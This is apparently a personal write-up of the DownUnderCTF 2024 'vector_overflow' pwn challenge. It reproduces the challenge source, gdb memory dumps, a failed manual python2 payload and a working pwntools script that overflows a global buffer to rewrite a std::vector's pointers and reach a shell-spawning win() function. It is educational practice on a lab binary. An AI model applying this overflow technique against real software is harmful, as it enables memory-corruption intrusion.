
Please overflow into the vector and control it!


### Reflection

After taking a break for a few months, it took quite some time to get back into the swing of things.
I found this challenge quite frustrating as I couldn't quite work out exactly why I was getting segmentation faults and other pointer errors with what I was sure was a working exploit. Checking out `std::vector` showed there are three elements to a vector, start position, end position and capacity but for some reason, my manual exploit gave a segmentation fault even though when looking at a writeup after, it was correct

### Summary


#### Tools used:

[[gdb-pwndbg]]
[[Valgrind]]
[[pwntools]]

#### Method
Given two files, the binary and source code. The important bits being:

	char buf[16];
	std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};
	
	void lose() {
	    puts("Bye!");
	    exit(1);
	}
	
	void win() {
	    system("/bin/sh");
	    exit(0);
	}
		
	int main() {
	    char ductf[6] = "DUCTF";
	    char* d = ductf;
		
	    std::cin >> buf;
	    if(v.size() == 5) {
	        for(auto &c : v) {
	            if(c != *d++) {
	                lose();
	            }
	        }
	        win();
	    }
	    lose();
	}

`└─$ checksec --file=vector_overflow
`Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH
`


The code above shows `std::cin >> buf;` is allocated to the char array `buf[16]` but as there is no bounds checking this (as the name suggests) will allow an overflow of the vector directly after it (). As PIE is disabled, this means we know exactly where that overflow will happen so we can the data we want in the vector, add some junk to fill the `buf` char array then overflow the following memory to point to our data with the end point and capacity immediately following.

using gdb-pwndbg, we can see that the the memory address of the start of the `buf` array is `RSI  0x4051e0 (buf) ◂— 0`

If we examine this memory using `x/16x 0x4051e0` we can see the following:

`pwndbg> x/32x 0x4051e0
`0x4051e0 <buf>: 0x61616161      0x62626262      0x63636363      0x64646464
`0x4051f0 <v>:   0x00418200      0x00000000      0x004182b5      0x00000000
`0x405200 <v+16>:        0x004182b5      0x00000000      0x00000000      0x00000000

We can see our entry of `aaaabbbbccccdddd` filling the 16 bit char array and the following vector allocated to `0x4051f0`. Entering `aaaabbbbccccddddeeee` to the binary should overflow the vector address with `0x65656565`

`pwndbg> x/32x 0x4051e0
`0x4051e0 <buf>: 0x61616161      0x62626262      0x63636363      0x64646464
`0x4051f0 <v>:   0x65656565      0x00000000      0x004182b5      0x00000000


So in theory, all we have to do is overwrite the three memory addresses following our char buffer with the position of the buffer, the end of the vector (in this case, as we are writing 'DUCTF' into the vector, it will be 5 bytes after the initial `buf` address) and the capacity which should be the same as the end address


**Here is where i tripped up** - up until now, I had been using a manual method of inputting the bytes needed with python2. 

`python2 -c "print 'DUCTF' + 'a' * 11 + '\xe0\x51\x40\x00\x00\x00\x00\x00\xe5\x51\x40\x00\x00\x00\x00\x00\xe5\x51\x40\x00\x00\x00\x00\x00'" > payload`

I then redirected the payload to the program:

```
┌──(kali㉿kali)-[~/Documents/Down Under CTF 24/pwn/vector overflow]
└─$ python2 -c "print 'DUCTF' + '\x00' * 11 + '\xe0\x51\x40\x00\x00\x00\x00\x00\xe5\x51\x40\x00\x00\x00\x00\x00\xe5\x51\x40\x00\x00\x00\x00\x00'" > payload

┌──(kali㉿kali)-[~/Documents/Down Under CTF 24/pwn/vector overflow]
└─$ ./vector_overflow < payload_final
free(): invalid pointer
zsh: IOT instruction  ./vector_overflow < payload
```

Unfortunately, I was not able to debug this in time for the challenge to end so didn't manage to get this working. 

After the challenge had ended, i tried a simple script on the binary using pwntools which works locally. I was unable to try this on the remote server.


```
from pwn import *

elf = ELF('./vector_overflow', checksec=False)
context.binary = elf

p = elf.process()
buf_address = 0x4051e0

payload = b"DUCTF"
payload += b"a" * 11
payload += p64(buf_address)
payload += p64(buf_address + 5)
payload += p64(buf_address + 5)

p.sendline(payload)

p.interactive()
```